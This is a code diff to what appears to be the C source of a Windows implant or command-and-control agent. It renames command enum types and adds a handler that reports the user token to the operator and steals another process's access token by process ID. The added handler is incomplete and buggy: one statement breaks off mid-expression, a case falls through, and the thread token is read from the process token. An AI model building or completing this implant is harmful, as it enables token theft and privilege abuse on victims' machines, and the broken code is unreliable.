@@ -131,7 +131,7 @@ _Leave:
 
 FUNC VOID CommandMemory(_In_ PPARSER Parser) {
     
-    MEM   MemOp = ParserGetInt32( Parser );
+    M_MEM MemOp = ParserGetInt32( Parser );
     BK_PACKAGE  = PackageCreate( COMMAND_MEMORY );
     DWORD Err   = 0;
 
@@ -201,8 +201,8 @@ FUNC VOID CommandExplorer(
 ) {
     BLACKOUT_INSTANCE
 
-    EXPLR Explorer = ParserGetInt32( Parser );
-    BOOL  bCheck   = FALSE;
+    M_EXPLR Explorer = ParserGetInt32( Parser );
+    BOOL    bCheck   = FALSE;
 
     BK_PACKAGE = PackageCreate( COMMAND_EXPLORER );
     
@@ -334,6 +334,51 @@ FUNC VOID CommandCheckin(
     PackageAddWString( BK_PACKAGE, Instance()->Transport.UserAgent );
 
     PackageTransmit( BK_PACKAGE, NULL, NULL );
+}
+
+FUNC VOID CommandToken(
+    PPARSER Parser
+) {
+    BLACKOUT_INSTANCE
+
+    BK_PACKAGE     = PackageCreate( COMMAND_TOKEN );
+    M_TOKEN mToken = ParserGetInt32( Parser );
+
+    switch ( mToken ) {
+        case UID: {
+            PSTR  UserProcToken     = NULL;
+            DWORD UserProcTokenLen  = 0;
+
+            PSTR  UserThreadToken    = NULL;
+            DWORD UserThreadTokenLen = 0;
+
+            GetTokenUserA( NtCurrentProcessToken(), &UserProcToken, &UserProcTokenLen );
+            GetTokenUserA( NtCurrentProcessToken(), &UserThreadToken, &UserThreadTokenLen );
+
+            PackageAddString( BK_PACKAGE, UserProcToken );
+            PackageAddString( BK_PACKAGE, UserThreadToken );
+            PackageTransmit( BK_PACKAGE, NULL, NULL );
+
+            bkHeapFree( UserProcToken, UserProcTokenLen );
+            bkHeapFree( UserThreadToken, UserThreadTokenLen );  
+        }
+        case STEAL: {
+            DWORD  ProcessId   = ParserGetInt32( Parser );
+            HANDLE TokenHandle = NULL;
+            BOOL   bCheck      = FALSE;
+             
+            bCheck = TokenSteal( ProcessId, &TokenHandle );
+            if ( !bCheck ) {
+                PackageTransmitError( NtLastError() ); return;
+            }
+
+            Instance()->Win32.
+        }
+    
+        default:
+        break;
+    }
+
 }
 
 FUNC VOID CommandSleep(
